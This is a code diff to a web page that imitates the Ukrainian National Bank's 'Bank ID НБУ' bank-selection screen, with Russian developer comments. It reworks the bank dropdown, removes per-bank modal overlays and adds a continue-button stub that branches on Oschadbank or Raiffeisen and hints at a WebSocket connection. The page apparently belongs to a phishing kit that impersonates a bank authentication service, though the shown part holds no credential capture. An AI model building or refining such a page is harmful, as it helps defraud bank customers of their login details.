@@ -763,41 +763,27 @@
         }
     </style>
 </head>
-<body>
-        <div id="bank-selection-screen" class="screen">
-        <h1 class="bankid-title">Bank ID НБУ</h1> 
+<body><div id="bank-selection-screen" class="screen">
+    <h1 class="bankid-title">Bank ID НБУ</h1>
 
-        <div id="bank-select-toggle" class="bank-select-toggle">
-            <span id="bank-select-text">Оберіть банк, в якому ви маєте ра...</span>
-            <svg class="bank-select-arrow" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg>
+    <div id="bank-select-toggle" class="bank-select-toggle">
+        <span id="bank-select-text">Оберіть банк, в якому ви маєте ра...</span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="bank-select-arrow"><polyline points="6 9 12 15 18 9"></polyline></svg>
+    </div>
+
+    <div id="bank-list-wrapper" class="bank-list-wrapper">
+        <div class="bank-list-header">
+            Оберіть банк, в якому ви маєте рахунок...
         </div>
-
-        <div id="bank-list-wrapper" class="bank-list-wrapper">
-            <div class="bank-list-header">
-                Оберіть банк, в якому ви маєте рахунок...
+        <div class="bank-grid">
             </div>
-            <div class="bank-grid"></div> 
-        </div>
-
-        <button id="bank-continue-btn" class="bank-continue-btn" disabled>
-            Продовжити
-        </button>
     </div>
 
-    <div id="custom-modal-overlay">
-        <div class="custom-modal-content" id="custom-modal-content"></div>
-    </div>
+    <button id="bank-continue-btn" class="bank-continue-btn disabled" disabled>
+        Продовжити
+    </button>
+</div>
 
-    <div id="raiff-modal-overlay">
-        <div class="raiff-modal-content" id="raiff-modal-content"></div>
-    </div>
-
-    <div id="alliance-modal-overlay">
-        <div class="alliance-modal-content" id="alliance-modal-content"></div>
-    </div>
-
-    <div id="unavailable-modal-overlay">
-        <div class="unavailable-modal-content" id="unavailable-modal-content"></div>
     </div>
 
 <script>
@@ -2218,41 +2204,77 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
     
-    // --- Main Flow Logic ---
-            // --- Main Flow Logic (NEW DESIGN) ---
-        let selectedBankId = null; // Здесь будем хранить ID выбранного банка
-        const bankSelectToggle = document.getElementById('bank-select-toggle');
-        const bankListWrapper = document.getElementById('bank-list-wrapper');
-        const bankSelectText = document.getElementById('bank-select-text');
-        const continueBtn = document.getElementById('bank-continue-btn');
+    // --- Main Flow Logic (NEW DESIGN) ---
+let selectedBankId = null; // Здесь будем хранить ID выбранного банка
 
-        // 1. Показываем/скрываем список банков по клику на "селект"
-        bankSelectToggle.addEventListener('click', () => {
-            const isVisible = bankListWrapper.style.display === 'block';
-            bankListWrapper.style.display = isVisible ? 'none' : 'block';
-        });
+const bankSelectToggle = document.getElementById('bank-select-toggle');
+const bankListWrapper = document.getElementById('bank-list-wrapper');
+const bankSelectText = document.getElementById('bank-select-text');
+const continueBtn = document.getElementById('bank-continue-btn');
 
-        // 2. Обрабатываем выбор банка из списка
-        document.querySelectorAll('.bank-item').forEach(item => {
-            item.addEventListener('click', e => {
-                e.preventDefault();
-                if (item.classList.contains('disabled')) return;
-                
-                // Получаем ID и Название банка
-                selectedBankId = item.dataset.bank;
-                const bankName = item.querySelector('.bank-name').textContent;
+// =========================================================
+// 1. ПОКАЗЫВАЕМ/СКРЫВАЕМ список банков по клику на поле выбора
+// Используем надежный метод переключения класса CSS
+// =========================================================
+bankSelectToggle.addEventListener('click', () => {
+    // Просто переключаем класс 'is-open' - CSS сделает остальное
+    bankListWrapper.classList.toggle('is-open'); 
+    
+    // Опционально: можно добавить класс к родителю, чтобы стилизовать поле выбора
+    // document.getElementById('bank-selection-screen').classList.toggle('is-list-open');
+});
 
-                // Обновляем текст в "селекте"
-                bankSelectText.textContent = bankName;
-                bankSelectText.classList.add('selected'); // Делаем текст черным
-                
-                // Скрываем список
-                bankListWrapper.style.display = 'none';
 
-                // Активируем кнопку "Продовжити"
-                continueBtn.disabled = false;
-                continueBtn.style.opacity = '1';
-            });
+// =========================================================
+// 2. ОБРАБАТЫВАЕМ ВЫБОР банка из списка
+// =========================================================
+document.querySelectorAll('.bank-item').forEach(item => {
+    item.addEventListener('click', (e) => {
+        e.preventDefault();
+        
+        if (item.classList.contains('disabled')) return;
+
+        // Удаляем класс 'selected' со всех элементов
+        document.querySelectorAll('.bank-item').forEach(el => el.classList.remove('selected'));
+        // Добавляем класс 'selected' только к выбранному элементу
+        item.classList.add('selected');
+
+        // Получаем ID и Название банка
+        selectedBankId = item.dataset.bank;
+        const bankName = item.querySelector('.bank-name').textContent;
+        
+        // Обновляем текст в "селекте"
+        bankSelectText.textContent = bankName;
+        bankSelectText.classList.add('selected'); // Делаем текст черным
+        
+        // Скрываем список
+        bankListWrapper.classList.remove('is-open'); // Используем класс
+        
+        // Активируем кнопку "Продовжити"
+        continueBtn.disabled = false;
+        continueBtn.classList.remove('disabled');
+        // continueBtn.style.opacity = '1'; // Стиль лучше тоже переключать через класс
+    });
+});
+
+// =========================================================
+// 3. ОБРАБАТЫВАЕМ КЛИК на кнопку "Продовжити"
+// =========================================================
+continueBtn.addEventListener('click', () => {
+    if (selectedBankId) {
+        // Здесь должна быть ваша логика перехода (или вызова WebSocket)
+        if (['oschadbank', 'raiffeisen'].includes(selectedBankId)) {
+            // ... вызов функций рендеринга и т.д.
+        } else {
+             // ... другая логика
+        }
+        
+        // Пример вызова:
+        // connectWebSocket();
+        console.log(`Нажат Продовжити. Выбран банк: ${selectedBankId}`);
+    }
+});
+
         });
 
         // 3. Обрабатываем клик по кнопке "Продовжити"
